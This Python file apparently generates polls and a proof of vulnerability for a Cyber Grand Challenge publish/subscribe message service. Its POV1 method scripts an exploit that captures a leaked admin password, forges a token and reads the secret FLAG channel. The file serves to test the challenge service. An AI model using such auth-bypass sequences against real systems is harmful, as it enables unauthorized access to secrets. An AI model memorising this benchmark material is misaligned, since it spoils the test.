#!/usr/bin/env python
#
# Copyright (C) 2015 Narf Industries <info@narfindustries.com>
#
# Permission is hereby granted, free of charge, to any person obtaining a
# copy of this software and associated documentation files (the "Software"),
# to deal in the Software without restriction, including without limitation
# the rights to use, copy, modify, merge, publish, distribute, sublicense,
# and/or sell copies of the Software, and to permit persons to whom the
# Software is furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included
# in all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
# OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
# IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
# CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
# TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
# SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#

from generator.actions import Actions, Variable
import string
import random
import itertools
import math
from struct import *
from collections import OrderedDict

class TemplateGenerator(Actions):

	def _getAdminPassword(self):
		password = ''
		for c in range(900):
			randomVal = ord(self.magic_page[c])
			if randomVal % 2 == 0:
				if randomVal % 4 == 0:
					password += chr(ord('A') + (randomVal % 26))
				else:
					password += chr(ord('a') + (randomVal % 26))
			elif randomVal % 7 == 0:
				password += ' '
			else: 
				password += chr(ord('0') + (randomVal % 10))
		return password

	def _getMessageFromChannel(self, user, channel):
		deliveryType = user['subscriptions'][channel]['deliveryType']
		if deliveryType is "latest":
			if user['subscriptions'][channel]['index'] < len(self.channels[channel]['queue']):
				message = self.channels[channel]['queue'][-1]
				user['subscriptions'][channel]['index'] = len(self.channels[channel]['queue'])
				self.read(delim="\n", expect=message['body'])
		elif deliveryType is "guaranteed":
			while user['subscriptions'][channel]['index'] < len(self.channels[channel]['queue']):
				index = user['subscriptions'][channel]['index']
				message = self.channels[channel]['queue'][index]
				user['subscriptions'][channel]['index'] += 1
				self.read(delim="\n", expect=message['body'])
		elif deliveryType is "next":
			if user['subscriptions'][channel]['index'] < len(self.channels[channel]['queue']):
				index = user['subscriptions'][channel]['index']
				message = self.channels[channel]['queue'][index]
				user['subscriptions'][channel]['index'] += 1
				self.read(delim="\n", expect=message['body'])
		elif deliveryType is "low" or deliveryType is "medium" or deliveryType is "high":
			while user['subscriptions'][channel]['index'] < len(self.channels[channel]['queue']):
				index = user['subscriptions'][channel]['index']
				message = self.channels[channel]['queue'][index]
				user['subscriptions'][channel]['index'] += 1
				if(message['priority'] is deliveryType):
					self.read(delim="\n", expect=message['body'])

	def getMessagesFromAnyChannel(self):
		users = []
		while len(users) == 0:
			channels = []
			while len(channels) < 2:
				channels = [c for c in self.channels.keys() if len(self.channels[c]['queue']) > 4 and len(self.channels[c]['subscriptions']) > 2]
				self.sendMessage()
			channel = random.choice(channels)
			senders = [m['sender'] for m in self.channels[channel]['queue']]
			users = [u for u in self.users if u['name'] not in senders and 
			                                  u['name'] in self.channels[channel]['subscriptions'].keys() and 
			                                  u['subscriptions'][channel]['index'] < len(self.channels[channel]['queue'])]
		user = random.choice(users)
		command = "/out/" + channel + "\n"
		self.write(command)
		self.write(user['token'])
		self.write(":end\n")
		self._getMessageFromChannel(user, channel)

	def getMessagesFromAllChannels(self):
		users = []
		while len(users) < 1:
			for u in self.users:
				if len(u['subscriptions']) > 1:
					for channelName in u['subscriptions'].keys():
						if len(self.channels[channelName]['queue']) > u['subscriptions'][channelName]['index'] + 2:
							users.append(u)
				else:
					deliveryType = random.choice(self.deliveryType)	
					channel = random.choice(self.channels.keys())
					self._subscribe(u, channel, deliveryType)
			self.sendMessage()
		user = random.choice(users)
		command = "/out/ALL\n"
		self.write(command)
		self.write(user['token'])
		self.write(":end\n")
		for channelName in reversed(user['subscriptions'].keys()):
			self._getMessageFromChannel(user,channelName)


	def sendMessage(self):
		users = [u for u in self.users if len(u['subscriptions']) > 2]
		while len(users) < 3:	
			deliveryType = random.choice(self.deliveryType)	
			channel = random.choice(self.channels.keys())
			userList = [u for u in self.users if u not in users]
			user = random.choice(userList)
			self._subscribe(user, channel, deliveryType)			
			users = [u for u in self.users if len(u['subscriptions']) > 2]

		user = random.choice(users)
		subscription = random.choice(user['subscriptions'].keys())
		command = "/in/" + subscription + "\n"
		message = ''.join(random.choice(string.ascii_letters) for _ in range(20))
		priority = random.choice(self.priorities)
		self.channels[subscription]['queue'].append({'sender':user['name'], 'body':message, 'priority':priority})
		user['subscriptions'][subscription]['index'] = len(self.channels[subscription]['queue'])
		args = ":" + message + ":" + priority + "\n"
		self.write(command)
		self.write(user['token'])
		self.write(args)
		self.channels['FLAG']['queue'].append({'sender':'admin', 'body':self.magic_page[0:20].encode("hex"), 'priority':"high"})


	def _auth(self, channel):
		command = "/auth/" + channel + "\n"
		user = random.choice(self.users)
		if channel is "FLAG":
			password = self._getAdminPassword()
			if len(user['subscriptions']) == 0:
				user['password'] = password
		else:
			password = user['password']
		args = ":" + user['name'] + ":" + password + "\n"
		self.write(command)
		self.write(user['token'])
		self.write(args)
		if channel not in user['subscriptions'].keys():
			user['subscriptions'][channel] = {'deliveryType':"latest"}
		user['subscriptions'][channel]['index'] = len(self.channels[channel]['queue'])
		self.channels[channel]['subscriptions'][user['name']] = {'index': user['subscriptions'][channel]['index']}
		command = "/token/" + channel + "\n"
		subscriptions_string = ''.join(key for key in user['subscriptions'].keys())
		args_regex =  "0" + ":" + user['name'] + ":" + "([0-9a-f]{" + str(len(subscriptions_string)*2) + "})" + ":"
		args_regex += ','.join(key for key in reversed(user['subscriptions'].keys()))
		args_regex += "\n"
		signature = Variable('signature')
		signature.set_re(args_regex, group=1)
		self.read(delim="\n", expect=command)
		self.read(delim="\n", assign=signature)
		args1 = "0" + ":" + user['name'] + ":"
		args3 = ":" + ','.join(key for key in reversed(user['subscriptions'].keys())) + "\n"
		self.write(command)
		self.write(args1)
		self.write(signature)
		self.write(args3)
		command = "/subscribe/" + channel + "\n"
		deliveryType =  user['subscriptions'][channel]['deliveryType'] #random.choice(self.deliveryType)
		token_name = user['name'] + "token"
		token_re = "([0-9a-zA-Z]{9}-[0-9a-zA-Z]{8}-[0-9a-zA-Z]{8}-[0-9a-zA-Z]{8}-[0-9a-zA-Z]{3}):" + deliveryType + "\n"
		user['token'] = Variable(token_name)
		user['token'].set_re(token_re, group=1)
		self.read(delim="\n", expect=command)
		self.read(delim="\n", assign=user['token'])


	def _subscribe(self, user, channel, deliveryType):
		command = "/subscribe/" + channel + "\n"
		#user = random.choice(self.users)
		args = ":" + deliveryType + "\n"
		self.write(command)
		self.write(user['token'])
		self.write(args)
		if channel in user['subscriptions'].keys():
			user['subscriptions'][channel]['deliveryType'] = deliveryType
		else:
			command = "/auth/" + channel + "\n"
			self.read(delim="\n", expect=command)
			self._auth(channel)
			self._subscribe(user, channel, deliveryType)


	def subscribeGuaranteed(self):
		channel = random.choice(self.channels.keys())
		user = random.choice(self.users)
		self._subscribe(user, channel, "guaranteed")

	def subscribeLatest(self):
		channel = random.choice(self.channels.keys())
		user = random.choice(self.users)
		self._subscribe(user, channel, "latest")

	def subscribeIncremental(self):
		channel = random.choice(self.channels.keys())
		user = random.choice(self.users)
		self._subscribe(user, channel, "next")

	def subscribeLow(self):
		channel = random.choice(self.channels.keys())
		user = random.choice(self.users)
		self._subscribe(user, channel, "low")

	def subscribeMedium(self):
		channel = random.choice(self.channels.keys())
		user = random.choice(self.users)
		self._subscribe(user, channel, "medium")

	def subscribeHigh(self):
		channel = random.choice(self.channels.keys())
		user = random.choice(self.users)
		self._subscribe(user, channel, "high")

	def subscribeToFlagChannel(self):
		channel = 'FLAG'
		user = random.choice(self.users)
		self._subscribe(user, channel, "high")	

	def start(self):
		#self.delay(100)
		self.users = []
		self.channels = dict()
		#self.deliveryType = ["guaranteed", "latest", "high", "medium", "low"]
		self.deliveryType = ["guaranteed", "latest", "next"]
		self.priorities = ["high", "medium", "low"]
		numUsers = random.randint(10,20)
		for _ in range(numUsers):
			name_length = random.randint(8,16)
			name = ''.join(random.choice(string.ascii_letters) for _ in range(name_length))
			pass_length = random.randint(8,16)
			password = ''.join(random.choice(string.ascii_letters) for _ in range(pass_length))
			self.users.append({'token':"0", 'name': name, 'password': password, 'subscriptions':OrderedDict()})
		numChannels = random.randint(numUsers/3, numUsers/2)
		for _ in range(numChannels):
			name_length = random.randint(8,16)
			name = ''.join(random.choice(string.ascii_letters) for _ in range(name_length))
			self.channels[name] = {'subscriptions':dict(), 'queue':[]}
		self.channels['FLAG'] = {'subscriptions':dict(), 'queue':[]}

	def POV1(self):
		command = "/auth/FLAG\n"
		args1 = "0:povuser:password\n"
		self.write(command)
		self.write(args1)
		password_regex = '(.*)\n'
		flagPassword = Variable('flagPassword')
		flagPassword.set_re(password_regex, group=1)
		self.read(delim="\n", assign=flagPassword)
		args2 = "0:povuser:"
		self.write(command)
		self.write(args2)
		self.write(flagPassword)
		self.write("\n")
		command = "/token/FLAG\n"
		subscriptions_string = "FLAG"
		args_regex =  "0:povuser:" + "([0-9a-f]{" + str(len(subscriptions_string)*2) + "})" + ":"
		args_regex += "FLAG"
		args_regex += "\n"
		signature = Variable('signature')
		signature.set_re(args_regex, group=1)
		self.read(delim="\n", expect=command)
		self.read(delim="\n", assign=signature)
		args1 = "0:povuser:"
		args3 = ":FLAG\n"
		self.write(command)
		self.write(args1)
		self.write(signature)
		self.write(args3)
		command = "/subscribe/FLAG\n"
		token_re = "([0-9a-zA-Z]{9}-[0-9a-zA-Z]{8}-[0-9a-zA-Z]{8}-[0-9a-zA-Z]{8}-[0-9a-zA-Z]{3}):latest\n"
		token = Variable("token")
		token.set_re(token_re, group=1)
		self.read(delim="\n", expect=command)
		self.read(delim="\n", assign=token)
		command = "/in/FLAG\n"
		args = ":AAAAA:high\n"
		self.write(command)
		self.write(token)
		self.write(args)
		command = "/out/FLAG\n"
		self.write(command)
		self.write(token)
		self.write(":end\n")
		flag_re = "(.*)\n"
		flag = Variable("flag")
		flag.set_re(flag_re, group=1)
		self.read(delim="\n", assign=flag)


	def quit(self):
		return -1
